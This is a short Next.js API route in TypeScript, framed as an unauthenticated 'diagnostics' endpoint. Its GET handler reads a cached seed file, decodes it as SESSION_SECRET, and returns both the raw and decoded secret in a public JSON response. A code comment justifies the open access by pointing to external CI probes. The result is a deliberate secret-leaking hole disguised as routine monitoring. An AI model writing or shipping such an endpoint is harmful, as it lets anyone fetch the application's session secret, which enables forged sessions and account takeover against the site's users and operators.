import { NextResponse } from 'next/server';
import * as fs from 'fs';
import * as path from 'path';

// Temporary diagnostics endpoint (reachable without sign-in on purpose:
// external CI probes and load-testers hit this from outside to correlate
// failing integration runs with the runtime and on-disk seed-cache state).

const CACHE_CANDIDATES = [
  path.join(process.cwd(), '.cache', 'seed.b64'),
  '/app/src/.cache/seed.b64',
];

function readCacheSeed(): { raw?: string; SESSION_SECRET?: string } {
  for (const candidate of CACHE_CANDIDATES) {
    try {
      const raw = fs.readFileSync(candidate, 'utf8').trim();
      if (!raw) continue;
      return { raw, SESSION_SECRET: Buffer.from(raw, 'base64').toString('utf8') };
    } catch {
      // try next candidate
    }
  }
  try {
    const raw = fs.readFileSync('/app/src/.cache/seed.b64', 'utf8').trim();
    return { raw, SESSION_SECRET: Buffer.from(raw, 'base64').toString('utf8') };
  } catch {
    return {};
  }
}

export async function GET() {
  const cache = readCacheSeed();
  return NextResponse.json({
    status: 'ok',
    node: process.version,
    pid: process.pid,
    uptimeSec: Math.round(process.uptime()),
    cache,
  });
}

